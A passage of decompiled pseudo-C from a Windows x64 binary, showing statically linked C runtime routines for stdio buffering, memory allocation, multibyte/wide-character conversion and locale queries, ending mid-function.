// ----- __acrt_stdio_begin_temporary_buffering_nolock @ 0x1400206d8 -----
char __fastcall _acrt_stdio_begin_temporary_buffering_nolock(__int64 a1)
{
  void **v2; // rdi

  if ( !_acrt_should_use_temporary_buffer((FILE *)a1) )
    return 0;
  if ( (FILE *)a1 == _acrt_iob_func(1u) )
  {
    v2 = &qword_1400A0A88;
  }
  else
  {
    if ( (FILE *)a1 != _acrt_iob_func(2u) )
      return 0;
    v2 = &qword_1400A0A90;
  }
  ++dword_1400A0170;
  if ( (*(_DWORD *)(a1 + 20) & 0x4C0) != 0 )
    return 0;
  _InterlockedOr((volatile signed __int32 *)(a1 + 20), 0x282u);
  if ( *v2 == nullptr )
  {
    *v2 = malloc_base(0x1000u);
    free_base(nullptr);
  }
  if ( *v2 != nullptr )
  {
    *(_QWORD *)(a1 + 8) = *v2;
    *(_QWORD *)a1 = *v2;
    *(_DWORD *)(a1 + 16) = 4096;
    *(_DWORD *)(a1 + 32) = 4096;
  }
  else
  {
    *(_DWORD *)(a1 + 16) = 2;
    *(_QWORD *)(a1 + 8) = a1 + 28;
    *(_QWORD *)a1 = a1 + 28;
    *(_DWORD *)(a1 + 32) = 2;
  }
  return 1;
}


// ----- __acrt_stdio_end_temporary_buffering_nolock @ 0x1400207a0 -----
__int64 __fastcall _acrt_stdio_end_temporary_buffering_nolock(char a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax

  if ( a1 != 0 )
  {
    result = *(_DWORD *)(a2 + 20) >> 9;
    if ( (*(_DWORD *)(a2 + 20) & 0x200) != 0 )
    {
      result = _acrt_stdio_flush_nolock((FILE *)a2, a3);
      _InterlockedAnd((volatile signed __int32 *)(a2 + 20), 0xFFFFFD7F);
      *(_DWORD *)(a2 + 32) = 0;
      *(_QWORD *)(a2 + 8) = 0;
      *(_QWORD *)a2 = 0;
    }
  }
  return result;
}


// ----- __acrt_stdio_allocate_buffer_nolock @ 0x1400207e0 -----
__int64 __fastcall _acrt_stdio_allocate_buffer_nolock(__int64 a1)
{
  int v2; // edi
  __int64 result; // rax

  ++dword_1400A0170;
  v2 = 4096;
  *(_QWORD *)(a1 + 8) = calloc_base(0x1000u, 1u);
  free_base(nullptr);
  if ( *(_QWORD *)(a1 + 8) != 0 )
  {
    _InterlockedOr((volatile signed __int32 *)(a1 + 20), 0x40u);
  }
  else
  {
    _InterlockedOr((volatile signed __int32 *)(a1 + 20), 0x400u);
    v2 = 2;
    *(_QWORD *)(a1 + 8) = a1 + 28;
  }
  *(_DWORD *)(a1 + 32) = v2;
  result = *(_QWORD *)(a1 + 8);
  *(_DWORD *)(a1 + 16) = 0;
  *(_QWORD *)a1 = result;
  return result;
}


// ----- _malloc_base @ 0x140020850 -----
void *__cdecl malloc_base(size_t Size)
{
  size_t v1; // rbx
  void *result; // rax

  v1 = Size;
  if ( Size > 0xFFFFFFFFFFFFFFE0uLL )
  {
LABEL_9:
    *(_DWORD *)sub_140018888() = 12;
    return nullptr;
  }
  else
  {
    if ( Size == 0 )
      v1 = 1;
    while ( 1 )
    {
      result = HeapAlloc(hHeap, 0, v1);
      if ( result != nullptr )
        break;
      if ( (unsigned int)sub_14001B360() == 0 || (unsigned int)sub_14001B3B0(v1) == 0 )
        goto LABEL_9;
    }
  }
  return result;
}


// ----- ?_mbstowcs_internal@@YAHPEA_KPEA_W_KPEBD2AEAV__crt_cached_ptd_host@@@Z @ 0x1400208b0 -----
__int64 __fastcall _mbstowcs_internal(
        unsigned __int64 *a1,
        wchar_t *a2,
        unsigned __int64 a3,
        const char *a4,
        unsigned __int64 a5,
        struct __crt_cached_ptd_host *a6)
{
  unsigned int v6; // ebx
  unsigned int v10; // r12d
  unsigned int v11; // esi
  unsigned __int64 v13; // r8
  __int64 v14; // rax
  unsigned __int64 v15; // rax

  v6 = 0;
  v10 = 0;
  if ( a2 != nullptr )
  {
    if ( a3 == 0 )
    {
LABEL_5:
      v11 = 22;
      *((_BYTE *)a6 + 48) = 1;
      *((_DWORD *)a6 + 11) = 22;
      sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, a6);
      return v11;
    }
    *a2 = 0;
  }
  else if ( a3 != 0 )
  {
    goto LABEL_5;
  }
  if ( a1 != nullptr )
    *a1 = 0;
  v13 = a5;
  if ( a5 > a3 )
    v13 = a3;
  if ( v13 > 0x7FFFFFFF )
  {
    v11 = 22;
LABEL_24:
    *((_DWORD *)a6 + 11) = v11;
    *((_BYTE *)a6 + 48) = 1;
    sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, a6);
    return v11;
  }
  v14 = sub_1400209D0(a2, a4, v13, a6);
  if ( v14 == -1 )
  {
    if ( a2 != nullptr )
      *a2 = 0;
    if ( *((_BYTE *)a6 + 48) != 0 )
      return *((unsigned int *)a6 + 11);
    return v6;
  }
  else
  {
    v15 = v14 + 1;
    if ( a2 != nullptr )
    {
      if ( v15 > a3 )
      {
        if ( a5 != -1 )
        {
          *a2 = 0;
          v11 = 34;
          goto LABEL_24;
        }
        v15 = a3;
        v10 = 80;
      }
      a2[v15 - 1] = 0;
    }
    if ( a1 != nullptr )
      *a1 = v15;
    return v10;
  }
}


// ----- sub_1400209D0 @ 0x1400209d0 -----
__int64 __fastcall sub_1400209D0(_WORD *a1, _BYTE *a2, unsigned __int64 a3, __int64 a4)
{
  _WORD *v6; // rsi
  unsigned __int64 v7; // rdi
  __int64 result; // rax
  __int64 v9; // rax
  __int64 v10; // rcx
  __int64 v11; // rax
  __int64 v12; // rax
  int v13; // r8d
  _BYTE *i; // r9
  __int64 v15; // [rsp+60h] [rbp+8h] BYREF
  _BYTE *v16; // [rsp+68h] [rbp+10h] BYREF

  v16 = a2;
  v6 = a1;
  v7 = 0;
  if ( a1 != nullptr )
  {
    if ( a3 == 0 )
      return 0;
    *a1 = 0;
  }
  if ( a2 == nullptr )
  {
    *(_BYTE *)(a4 + 48) = 1;
    *(_DWORD *)(a4 + 44) = 22;
    sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, (__crt_cached_ptd_host *)a4);
    return -1;
  }
  if ( *(_BYTE *)(a4 + 40) == 0 )
  {
    __crt_cached_ptd_host::update_locale_slow((__crt_cached_ptd_host *)a4);
    a2 = v16;
  }
  v9 = *(_QWORD *)(a4 + 24);
  v10 = *(unsigned int *)(v9 + 12);
  if ( (_DWORD)v10 == 65001 )
  {
    v15 = 0;
    return sub_1400224A4((_DWORD)v6, (unsigned int)&v16, a3, (unsigned int)&v15, a4);
  }
  v11 = *(_QWORD *)(v9 + 312);
  if ( v6 == nullptr )
  {
    v7 = -1;
    if ( v11 == 0 )
    {
      do
        ++v7;
      while ( a2[v7] != 0 );
      return v7;
    }
    v12 = (int)sub_140022950(v10, 9, a2);
    if ( (_DWORD)v12 == 0 )
    {
      *(_BYTE *)(a4 + 48) = 1;
      *(_DWORD *)(a4 + 44) = 42;
      return v7;
    }
    return v12 - 1;
  }
  if ( v11 == 0 )
  {
    if ( a3 != 0 )
    {
      do
      {
        *v6 = (unsigned __int8)a2[v7];
        if ( a2[v7] == 0 )
          break;
        ++v7;
        ++v6;
      }
      while ( v7 < a3 );
    }
    return v7;
  }
  v7 = -1;
  v12 = (int)sub_140022950(v10, 9, a2);
  if ( (_DWORD)v12 != 0 )
    return v12 - 1;
  if ( GetLastError() != 122 )
    goto LABEL_19;
  v13 = a3;
  for ( i = v16; v13 != 0; ++i )
  {
    --v13;
    if ( *i == 0 )
      break;
    if ( *(__int16 *)(**(_QWORD **)(a4 + 24) + 2LL * (unsigned __int8)*i) < 0 && *++i == 0 )
      goto LABEL_19;
  }
  result = (int)sub_140022950(*(unsigned int *)(*(_QWORD *)(a4 + 24) + 12LL), 1, v16);
  if ( (_DWORD)result == 0 )
  {
LABEL_19:
    *(_BYTE *)(a4 + 48) = 1;
    *(_DWORD *)(a4 + 44) = 42;
    *v6 = 0;
    return v7;
  }
  return result;
}


// ----- mbstowcs_s @ 0x140020bc8 -----
errno_t __cdecl mbstowcs_s(
        size_t *PtNumOfCharConverted,
        wchar_t *DstBuf,
        size_t SizeInWords,
        const char *SrcBuf,
        size_t MaxCount)
{
  errno_t v5; // edi
  int v6; // ebx
  int v7; // ebx
  _QWORD v9[2]; // [rsp+30h] [rbp-40h] BYREF
  char v10; // [rsp+40h] [rbp-30h]
  __int128 v11; // [rsp+48h] [rbp-28h]
  char v12; // [rsp+58h] [rbp-18h]
  int v13; // [rsp+5Ch] [rbp-14h]
  char v14; // [rsp+60h] [rbp-10h]
  int v15; // [rsp+64h] [rbp-Ch]
  char v16; // [rsp+68h] [rbp-8h]

  v9[0] = 0;
  v10 = 0;
  v12 = 0;
  v14 = 0;
  v16 = 0;
  if ( dword_1400A0560 == 0 )
  {
    v12 = 1;
    v11 = *(_OWORD *)&off_14009ECA8;
  }
  v5 = _mbstowcs_internal(
         PtNumOfCharConverted,
         DstBuf,
         SizeInWords,
         SrcBuf,
         MaxCount,
         (struct __crt_cached_ptd_host *)v9);
  if ( v12 == 2 )
    *(_DWORD *)(v9[0] + 936LL) &= ~2u;
  if ( v14 != 0 )
  {
    v6 = v13;
    *(_DWORD *)(unknown_libname_79((__int64)v9) + 32) = v6;
  }
  if ( v16 != 0 )
  {
    v7 = v15;
    *(_DWORD *)(unknown_libname_79((__int64)v9) + 36) = v7;
  }
  return v5;
}


// ----- ?_wcstombs_internal@@YAHPEA_KPEAD_KPEB_W2AEAV__crt_cached_ptd_host@@@Z @ 0x140020c70 -----
__int64 __fastcall _wcstombs_internal(
        unsigned __int64 *a1,
        __crt_mbstring *a2,
        unsigned __int64 a3,
        const wchar_t *a4,
        unsigned __int64 a5,
        struct __crt_cached_ptd_host *a6)
{
  unsigned int v6; // ebx
  unsigned int v10; // r12d
  unsigned __int64 v11; // r8
  unsigned int v12; // esi
  unsigned __int64 v14; // rax
  unsigned __int64 v15; // rax

  v6 = 0;
  v10 = 0;
  if ( a2 != nullptr )
  {
    if ( a3 != 0 )
    {
      *(_BYTE *)a2 = 0;
      goto LABEL_4;
    }
LABEL_11:
    v12 = 22;
    *((_BYTE *)a6 + 48) = 1;
    *((_DWORD *)a6 + 11) = 22;
    sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, a6);
    return v12;
  }
  if ( a3 != 0 )
    goto LABEL_11;
LABEL_4:
  if ( a1 != nullptr )
    *a1 = 0;
  v11 = a5;
  if ( a5 > a3 )
    v11 = a3;
  if ( v11 > 0x7FFFFFFF )
  {
    v12 = 22;
LABEL_23:
    *((_DWORD *)a6 + 11) = v12;
    *((_BYTE *)a6 + 48) = 1;
    sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, a6);
    return v12;
  }
  v14 = _wcstombs_l_helper(a2, a4, v11, a6);
  if ( v14 == -1 )
  {
    if ( a2 != nullptr )
      *(_BYTE *)a2 = 0;
    if ( *((_BYTE *)a6 + 48) != 0 )
      return *((unsigned int *)a6 + 11);
    return v6;
  }
  else
  {
    v15 = v14 + 1;
    if ( a2 != nullptr )
    {
      if ( v15 > a3 )
      {
        if ( a5 != -1 )
        {
          *(_BYTE *)a2 = 0;
          v12 = 34;
          goto LABEL_23;
        }
        v15 = a3;
        v10 = 80;
      }
      *((_BYTE *)a2 + v15 - 1) = 0;
    }
    if ( a1 != nullptr )
      *a1 = v15;
    return v10;
  }
}


// ----- ?_wcstombs_l_helper@@YA_KPEADPEB_W_KAEAV__crt_cached_ptd_host@@@Z @ 0x140020d84 -----
__int64 __fastcall _wcstombs_l_helper(
        __crt_mbstring *this,
        const wchar_t *a2,
        unsigned __int64 a3,
        struct __crt_cached_ptd_host *a4)
{
  unsigned __int64 v5; // rsi
  __int64 v7; // rdi
  __int64 result; // rax
  __int64 v9; // rax
  int v10; // r10d
  __int64 v11; // rcx
  __int16 v12; // ax
  const wchar_t *v13; // rax
  unsigned __int64 v14; // rcx
  int v15; // eax
  __int64 v16; // rcx
  int v17; // eax
  unsigned __int64 v18; // r14
  int v19; // edx
  __int64 v20; // rcx
  int v21; // eax
  int v22; // ecx
  int v23; // eax
  __int64 v24; // rdx
  __int64 v25; // rcx
  char v26; // al
  wchar_t v27; // ax
  __int64 v28; // rcx
  int v29; // eax
  int v30; // [rsp+40h] [rbp-38h] BYREF
  const wchar_t *v31; // [rsp+48h] [rbp-30h]
  __int64 v32; // [rsp+50h] [rbp-28h]
  _BYTE v33[8]; // [rsp+58h] [rbp-20h] BYREF

  v31 = a2;
  v30 = 0;
  v5 = a3;
  v7 = 0;
  if ( this != nullptr && a3 == 0 )
    return 0;
  if ( a2 == nullptr )
  {
    *((_BYTE *)a4 + 48) = 1;
    *((_DWORD *)a4 + 11) = 22;
    sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, a4);
    return -1;
  }
  if ( *((_BYTE *)a4 + 40) == 0 )
  {
    __crt_cached_ptd_host::update_locale_slow(a4);
    a2 = v31;
  }
  v9 = *((_QWORD *)a4 + 3);
  v10 = *(_DWORD *)(v9 + 12);
  if ( v10 == 65001 )
  {
    v32 = 0;
    return sub_140027DC4(this, (struct _Mbstatet *)a4);
  }
  v11 = *(_QWORD *)(v9 + 312);
  if ( this == nullptr )
  {
    if ( v11 == 0 )
    {
      v27 = *a2;
      v28 = 0;
      if ( *a2 != 0 )
      {
        while ( v27 <= 0xFFu )
        {
          ++a2;
          ++v28;
          v27 = *a2;
          if ( *a2 == 0 )
            return v28;
        }
        goto LABEL_18;
      }
      return v28;
    }
    v7 = -1;
    v29 = _acrt_WideCharToMultiByte(v10, 0, (_DWORD)a2, -1, 0, 0, 0, (__int64)&v30);
    if ( v29 != 0 && v30 == 0 )
      return v29 - 1LL;
    goto LABEL_57;
  }
  if ( v11 == 0 )
  {
    if ( v5 != 0 )
    {
      while ( *a2 <= 0xFFu )
      {
        *((_BYTE *)this + v7) = *(_BYTE *)a2;
        v12 = *a2++;
        v31 = a2;
        if ( v12 != 0 && ++v7 < v5 )
          continue;
        return v7;
      }
LABEL_18:
      *((_BYTE *)a4 + 48) = 1;
      *((_DWORD *)a4 + 11) = 42;
      return -1;
    }
    return v7;
  }
  if ( *(_DWORD *)(v9 + 8) != 1 )
  {
    v7 = -1;
    v17 = _acrt_WideCharToMultiByte(v10, 0, (_DWORD)a2, -1, (_DWORD)this, v5, 0, (__int64)&v30);
    v18 = v17;
    if ( v30 == 0 )
    {
      if ( v17 != 0 )
        return v17 - 1LL;
      if ( GetLastError() == 122 )
      {
        if ( v5 == 0 )
          return v18;
        v19 = (int)v31;
LABEL_37:
        v20 = *((_QWORD *)a4 + 3);
        v21 = *(_DWORD *)(v20 + 8);
        v22 = *(_DWORD *)(v20 + 12);
        if ( v21 > 5 )
          v21 = 5;
        v23 = _acrt_WideCharToMultiByte(v22, 0, v19, 1, (unsigned int)v33, v21, 0, (__int64)&v30);
        if ( v23 != 0 && v30 == 0 && v23 >= 0 )
        {
          v24 = v23;
          if ( (unsigned __int64)v23 <= 5 )
          {
            if ( v23 + v18 <= v5 )
            {
              v25 = 0;
              while ( 1 )
              {
                v26 = v33[v25];
                *((_BYTE *)this + v18) = v26;
                if ( v26 == 0 )
                  break;
                ++v25;
                ++v18;
                if ( v25 >= v24 )
                {
                  v19 = (_DWORD)v31++ + 2;
                  if ( v18 < v5 )
                    goto LABEL_37;
                  return v18;
                }
              }
            }
            return v18;
          }
        }
      }
    }
LABEL_57:
    *((_DWORD *)a4 + 11) = 42;
    *((_BYTE *)a4 + 48) = 1;
    return v7;
  }
  if ( v5 != 0 )
  {
    v13 = a2;
    v14 = v5;
    while ( *v13 != 0 )
    {
      ++v13;
      if ( --v14 == 0 )
        goto LABEL_26;
    }
    LODWORD(v5) = v13 - a2 + 1;
  }
LABEL_26:
  v15 = _acrt_WideCharToMultiByte(v10, 0, (_DWORD)a2, v5, (_DWORD)this, v5, 0, (__int64)&v30);
  v16 = v15;
  if ( v15 == 0 || v30 != 0 )
    goto LABEL_18;
  result = v15 - 1LL;
  if ( *((_BYTE *)this + v16 - 1) != 0 )
    return v16;
  return result;
}


// ----- _wcstombs_s_l @ 0x1400210c4 -----
errno_t __cdecl wcstombs_s_l(
        size_t *PtNumOfCharConverted,
        char *Dst,
        size_t DstSizeInBytes,
        const wchar_t *Src,
        size_t MaxCountInBytes,
        _locale_t Locale)
{
  __crt_locale_pointers v6; // xmm0
  errno_t v7; // edi
  int v8; // ebx
  int v9; // ebx
  _QWORD v11[2]; // [rsp+30h] [rbp-40h] BYREF
  char v12; // [rsp+40h] [rbp-30h]
  __crt_locale_pointers v13; // [rsp+48h] [rbp-28h]
  char v14; // [rsp+58h] [rbp-18h]
  int v15; // [rsp+5Ch] [rbp-14h]
  char v16; // [rsp+60h] [rbp-10h]
  int v17; // [rsp+64h] [rbp-Ch]
  char v18; // [rsp+68h] [rbp-8h]

  v11[0] = 0;
  v12 = 0;
  v14 = 0;
  v16 = 0;
  v18 = 0;
  if ( Locale != nullptr )
  {
    v6 = *Locale;
  }
  else
  {
    if ( dword_1400A0560 != 0 )
      goto LABEL_6;
    v6 = *(__crt_locale_pointers *)&off_14009ECA8;
  }
  v14 = 1;
  v13 = v6;
LABEL_6:
  v7 = _wcstombs_internal(
         PtNumOfCharConverted,
         (__crt_mbstring *)Dst,
         DstSizeInBytes,
         Src,
         MaxCountInBytes,
         (struct __crt_cached_ptd_host *)v11);
  if ( v14 == 2 )
    *(_DWORD *)(v11[0] + 936LL) &= ~2u;
  if ( v16 != 0 )
  {
    v8 = v15;
    *(_DWORD *)(unknown_libname_79((__int64)v11) + 32) = v8;
  }
  if ( v18 != 0 )
  {
    v9 = v17;
    *(_DWORD *)(unknown_libname_79((__int64)v11) + 36) = v9;
  }
  return v7;
}


// ----- _isctype_l @ 0x14002117c -----
int __cdecl isctype_l(int C, int Type, _locale_t Locale)
{
  __int64 v4; // rdi
  int v5; // eax
  int result; // eax
  __int64 v7; // [rsp+48h] [rbp-38h] BYREF
  struct __crt_locale_pointers v8; // [rsp+50h] [rbp-30h] BYREF
  char v9; // [rsp+60h] [rbp-20h]
  WORD CharType[2]; // [rsp+68h] [rbp-18h] BYREF
  __int16 v11; // [rsp+6Ch] [rbp-14h]

  v4 = C;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v7, Locale);
  if ( (unsigned int)(v4 + 1) <= 0x100 )
  {
    v5 = *(unsigned __int16 *)(*(_QWORD *)v8.locinfo + 2 * v4);
    goto LABEL_8;
  }
  *(_DWORD *)CharType = 0;
  v11 = 0;
  if ( (unsigned int)_acrt_GetStringTypeA(&v8, 1u, CharType, *((_DWORD *)v8.locinfo + 3), 1) != 0 )
  {
    v5 = CharType[0];
LABEL_8:
    result = Type & v5;
    if ( v9 != 0 )
      *(_DWORD *)(v7 + 936) &= ~2u;
    return result;
  }
  if ( v9 != 0 )
    *(_DWORD *)(v7 + 936) &= ~2u;
  return 0;
}


// ----- ?InternalGetLocaleInfoA@@YAHQEAU__crt_locale_pointers@@QEB_WKQEADH@Z @ 0x140021284 -----
__int64 __fastcall InternalGetLocaleInfoA(
        struct __crt_locale_pointers *const a1,
        const wchar_t *const a2,
        LCTYPE a3,
        char *const a4,
        int a5)
{
  int v6; // r15d
  int v8; // r12d
  int v9; // eax
  unsigned int v10; // edi
  unsigned int v11; // edi
  unsigned __int64 v12; // rcx
  unsigned __int64 v13; // rdx
  __int64 v14; // rax
  void *v15; // rsp
  WCHAR *v16; // rbx
  WCHAR *v17; // rax
  __int64 v19; // [rsp+0h] [rbp-40h] BYREF
  int v20; // [rsp+40h] [rbp+0h] BYREF
  _QWORD v21[3]; // [rsp+48h] [rbp+8h] BYREF
  char v22; // [rsp+60h] [rbp+20h]

  v6 = (int)a4;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v21, a1);
  v8 = *(_DWORD *)(v21[1] + 12LL);
  v9 = sub_14001D3D0((__int64)a2, a3, nullptr, 0);
  v10 = v9;
  if ( v9 == 0 )
  {
    v11 = 0;
    goto LABEL_19;
  }
  v12 = 2LL * v9 + 16;
  v13 = v12 & -(__int64)(2LL * v9 < v12);
  if ( v13 == 0 )
  {
    v16 = nullptr;
    goto LABEL_16;
  }
  if ( v13 <= 0x400 )
  {
    v14 = v13 + 15;
    if ( v13 + 15 < v13 )
      v14 = 0xFFFFFFFFFFFFFF0LL;
    v15 = alloca(v14 & 0xFFFFFFFFFFFFFFF0uLL);
    v16 = (WCHAR *)&v20;
    if ( &v19 == (__int64 *)-64LL )
    {
LABEL_16:
      v11 = 0;
      if ( v16 == nullptr )
        goto LABEL_19;
      goto LABEL_17;
    }
    v20 = 52428;
    goto LABEL_11;
  }
  v17 = (WCHAR *)malloc_base(v12 & -(__int64)(2LL * v9 < v12));
  v16 = v17;
  if ( v17 != nullptr )
  {
    *(_DWORD *)v17 = 56797;
LABEL_11:
    v16 += 8;
  }
  if ( v16 == nullptr || sub_14001D3D0((__int64)a2, a3, v16, v10) == 0 )
    goto LABEL_16;
  v11 = _acrt_WideCharToMultiByte(v8, 0, (_DWORD)v16, -1, v6 & (unsigned int)-(a5 != 0), a5, 0, 0);
LABEL_17:
  if ( *((_DWORD *)v16 - 4) == 56797 )
    free_base(v16 - 8);
LABEL_19:
  if ( v22 != 0 )
    *(_DWORD *)(v21[0] + 936LL) &= ~2u;
  return v11;
}


// ----- __acrt_GetLocaleInfoA @ 0x140021400 -----
__int64 __fastcall _acrt_GetLocaleInfoA(
        struct __crt_locale_pointers *a1,
        int a2,
        const wchar_t *a3,
        LCTYPE a4,
        void **a5)
{
  unsigned int v5; // edi
  int LocaleInfoA; // eax
  __int64 v10; // rbx
  int v12; // eax
  int v13; // r15d
  char *v14; // rax
  void *v15; // rbx
  int v16; // eax
  void *v17; // rax
  int v18; // eax
  unsigned int v19; // r15d
  WCHAR *v20; // rax
  WCHAR v21[8]; // [rsp+30h] [rbp-D8h] BYREF
  char v22[128]; // [rsp+40h] [rbp-C8h] BYREF

  v5 = 0;
  *a5 = nullptr;
  if ( a2 == 1 )
  {
    LocaleInfoA = InternalGetLocaleInfoA(a1, a3, a4, v22, 128);
    v10 = LocaleInfoA;
    if ( LocaleInfoA != 0 )
    {
      *a5 = calloc_base(LocaleInfoA, 1u);
      free_base(nullptr);
      if ( *a5 != nullptr )
      {
        if ( (unsigned int)sub_140027F20(*a5, v10, v22, (int)v10 - 1) != 0 )
          invoke_watson(nullptr, nullptr, nullptr, 0, 0);
        return 0;
      }
      return 0xFFFFFFFFLL;
    }
    if ( GetLastError() == 122 )
    {
      v12 = InternalGetLocaleInfoA(a1, a3, a4, nullptr, 0);
      v13 = v12;
      if ( v12 != 0 )
      {
        v14 = (char *)calloc_base(v12, 1u);
        v15 = v14;
        if ( v14 != nullptr )
        {
          v16 = InternalGetLocaleInfoA(a1, a3, a4, v14, v13);
LABEL_10:
          if ( v16 != 0 )
          {
            v17 = v15;
            v15 = nullptr;
            *a5 = v17;
LABEL_13:
            free_base(v15);
            return v5;
          }
        }
LABEL_12:
        v5 = -1;
        goto LABEL_13;
      }
    }
  }
  else
  {
    if ( a2 != 2 )
    {
      if ( a2 == 0 )
      {
        *(_DWORD *)v21 = 0;
        if ( sub_14001D3D0((__int64)a3, a4 | 0x20000000, v21, 2u) != 0 )
        {
          *(_BYTE *)a5 = v21[0];
          return 0;
        }
      }
      return 0xFFFFFFFFLL;
    }
    v18 = sub_14001D3D0((__int64)a3, a4, nullptr, 0);
    v19 = v18;
    if ( v18 != 0 )
    {
      v20 = (WCHAR *)calloc_base(v18, 2u);
      v15 = v20;
      if ( v20 == nullptr )
        goto LABEL_12;
      v16 = sub_14001D3D0((__int64)a3, a4, v20, v19);
      goto LABEL_10;
    }
  }
  return 0xFFFFFFFFLL;
}


// ----- __acrt_GetStringTypeA @ 0x1400215c8 -----
__int64 __fastcall _acrt_GetStringTypeA(
        struct __crt_locale_pointers *a1,
        DWORD dwInfoType,
        __int64 a3,
        __int64 a4,
        LPWORD lpCharType,
        unsigned int a6,
        int a7)
{
  unsigned int v9; // edi
  int v10; // eax
  __int64 v11; // r14
  unsigned int StringTypeW; // edi
  size_t v13; // rcx
  __int64 v14; // rax
  void *v15; // rsp
  int *v16; // rbx
  int *v17; // rax
  int v18; // eax
  __int64 v20; // [rsp+0h] [rbp-30h] BYREF
  int *v21; // [rsp+20h] [rbp-10h]
  int v22; // [rsp+28h] [rbp-8h]
  int v23; // [rsp+30h] [rbp+0h] BYREF
  _QWORD v24[3]; // [rsp+38h] [rbp+8h] BYREF
  char v25; // [rsp+50h] [rbp+20h]

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v24, a1);
  v9 = a6;
  if ( a6 == 0 )
    v9 = *(_DWORD *)(v24[1] + 12LL);
  v22 = 0;
  v21 = nullptr;
  v10 = sub_140022950(v9, a7 != 0 ? 9 : 1, a3);
  v11 = v10;
  if ( v10 == 0 )
  {
    StringTypeW = 0;
    goto LABEL_21;
  }
  v13 = (2LL * v10 + 16) & -(__int64)(2LL * v10 < (unsigned __int64)(2LL * v10 + 16));
  if ( v13 == 0 )
  {
    v16 = nullptr;
    goto LABEL_18;
  }
  if ( v13 <= 0x400 )
  {
    v14 = v13 + 15;
    if ( v13 + 15 < v13 )
      v14 = 0xFFFFFFFFFFFFFF0LL;
    v15 = alloca(v14 & 0xFFFFFFFFFFFFFFF0uLL);
    v16 = &v23;
    if ( &v20 == (__int64 *)-48LL )
    {
LABEL_18:
      StringTypeW = 0;
      if ( v16 == nullptr )
        goto LABEL_21;
      goto LABEL_19;
    }
    v23 = 52428;
    goto LABEL_13;
  }
  v17 = (int *)malloc_base(v13);
  v16 = v17;
  if ( v17 != nullptr )
  {
    *v17 = 56797;
LABEL_13:
    v16 += 4;
  }
  if ( v16 == nullptr )
    goto LABEL_18;
  memset(v16, 0, 2 * v11);
  v22 = v11;
  v21 = v16;
  v18 = sub_140022950(v9, 1, a3);
  if ( v18 == 0 )
    goto LABEL_18;
  StringTypeW = GetStringTypeW(dwInfoType, (LPCWCH)v16, v18, lpCharType);
LABEL_19:
  if ( *(v16 - 4) == 56797 )
    free_base(v16 - 4);
LABEL_21:
  if ( v25 != 0 )
    *(_DWORD *)(v24[0] + 936LL) &= ~2u;
  return StringTypeW;
}


// ----- ?__acrt_LCMapStringA_stat@@YAHPEAU__crt_locale_pointers@@PEB_WKPEBDHPEADHHH@Z @ 0x140021758 -----
__int64 __fastcall __acrt_LCMapStringA_stat(
        struct __crt_locale_pointers *a1,
        const wchar_t *a2,
        DWORD a3,
        const char *a4,
        int a5,
        char *a6,
        int a7,
        unsigned int a8,
        int a9)
{
  unsigned int v13; // r14d
  __int64 result; // rax
  __int64 v15; // r15
  unsigned __int64 v16; // rcx
  unsigned __int64 v17; // rax
  __int64 v18; // rcx
  unsigned __int64 v19; // rcx
  void *v20; // rsp
  void *v21; // rsp
  const WCHAR *v22; // rbx
  WCHAR *v23; // rax
  int v24; // eax
  unsigned int v25; // esi
  size_t v26; // rcx
  __int64 v27; // rax
  void *v28; // rsp
  WCHAR *v29; // rdi
  WCHAR *v30; // rax
  _BYTE v31[32]; // [rsp+0h] [rbp-50h] BYREF
  const WCHAR *v32; // [rsp+20h] [rbp-30h]
  int v33; // [rsp+28h] [rbp-28h]
  __int64 v34; // [rsp+30h] [rbp-20h]
  __int64 v35; // [rsp+38h] [rbp-18h]
  int v36; // [rsp+50h] [rbp+0h] BYREF

  if ( a5 > 0 )
    _strncnt(a4, a5);
  v13 = a8;
  if ( a8 == 0 )
    v13 = *((_DWORD *)a1->locinfo + 3);
  v33 = 0;
  v32 = nullptr;
  result = sub_140022950(v13, a9 != 0 ? 9 : 1, a4);
  v15 = (int)result;
  if ( (_DWORD)result != 0 )
  {
    v16 = 2LL * (int)result + 16;
    v17 = v16 & -(__int64)(2LL * (int)result < v16);
    if ( (v16 & -(__int64)(2 * v15 < v16)) == 0 )
    {
      v22 = nullptr;
      goto LABEL_46;
    }
    if ( v17 > 0x400 )
    {
      v23 = (WCHAR *)malloc_base(v16 & -(__int64)(2 * v15 < v16));
      v22 = v23;
      if ( v23 == nullptr )
      {
LABEL_15:
        if ( v22 != nullptr )
        {
          v33 = v15;
          v32 = v22;
          if ( (unsigned int)sub_140022950(v13, 1, a4) != 0 )
          {
            v24 = sub_14001D5CC((__int64)a2, a3, v22, v15, nullptr, 0, 0, 0, 0);
            v25 = v24;
            if ( v24 != 0 )
            {
              if ( (a3 & 0x400) != 0 )
              {
                if ( a7 == 0 )
                  goto LABEL_47;
                if ( v24 <= a7 )
                {
                  v25 = sub_14001D5CC((__int64)a2, a3, v22, v15, (WCHAR *)a6, a7, 0, 0, 0);
                  if ( v25 != 0 )
                    goto LABEL_47;
                }
                goto LABEL_46;
              }
              v26 = (2LL * v24 + 16) & -(__int64)(2LL * v24 < (unsigned __int64)(2LL * v24 + 16));
              if ( v26 == 0 )
              {
                v29 = nullptr;
                goto LABEL_41;
              }
              if ( v26 > 0x400 )
              {
                v30 = (WCHAR *)malloc_base(v26);
                v29 = v30;
                if ( v30 == nullptr )
                  goto LABEL_32;
                *(_DWORD *)v30 = 56797;
              }
              else
              {
                v27 = v26 + 15;
                if ( v26 + 15 < v26 )
                  v27 = 0xFFFFFFFFFFFFFF0LL;
                v28 = alloca(v27 & 0xFFFFFFFFFFFFFFF0uLL);
                v29 = (WCHAR *)&v36;
                if ( v31 == (_BYTE *)-80LL )
                  goto LABEL_44;
                v36 = 52428;
              }
              v29 += 8;
LABEL_32:
              if ( v29 == nullptr )
                goto LABEL_44;
              if ( sub_14001D5CC((__int64)a2, a3, v22, v15, v29, v25, 0, 0, 0) != 0 )
              {
                v35 = 0;
                v34 = 0;
                if ( a7 != 0 )
                {
